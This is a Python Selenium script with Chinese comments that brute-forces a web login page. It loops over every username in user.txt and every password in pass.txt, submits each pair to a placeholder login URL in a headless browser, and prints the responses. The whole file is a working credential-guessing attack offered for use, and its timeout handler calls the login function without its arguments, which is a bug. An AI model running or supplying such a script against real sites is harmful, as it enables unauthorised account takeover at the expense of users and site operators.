# coding=utf-8
from selenium import webdriver
from selenium.common.exceptions import TimeoutException
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time

# 创建浏览器
option = webdriver.ChromeOptions()
option.add_argument("headless")
# driver = webdriver.Chrome()
browser = webdriver.Chrome("C:\Program Files (x86)\Google\Chrome\Application\chromedriver.exe",chrome_options=option)
# browser = webdriver.Chrome()
wait = WebDriverWait(browser, 10)
#browser.set_window_size(1400, 900)


# 登录操作
def login(user, upass):
    try:
        browser.get('http://xxxxx/login.jsp')
        input_user = wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, '#username')))
        input_pass = wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, '#password')))
        submit = wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, '#btn-login')))
        input_user.send_keys(user)
        input_pass.send_keys(upass)
        time.sleep(5)
        submit.click()
        browser.implicitly_wait(5)
        content = browser.find_element_by_css_selector('#login-form > div.alert.is-danger')
        print(content.text,user,upass)
        #browser.quit()
    except TimeoutException:
        return login()


def main():
    with open('user.txt', 'r') as f:
        for i in f:
            with open("pass.txt","r") as f1:
                for ii in f1:
                    time.sleep(1)
                    login(i,ii)
    time.sleep(1)
    browser.close()

if __name__ == '__main__':
    main()
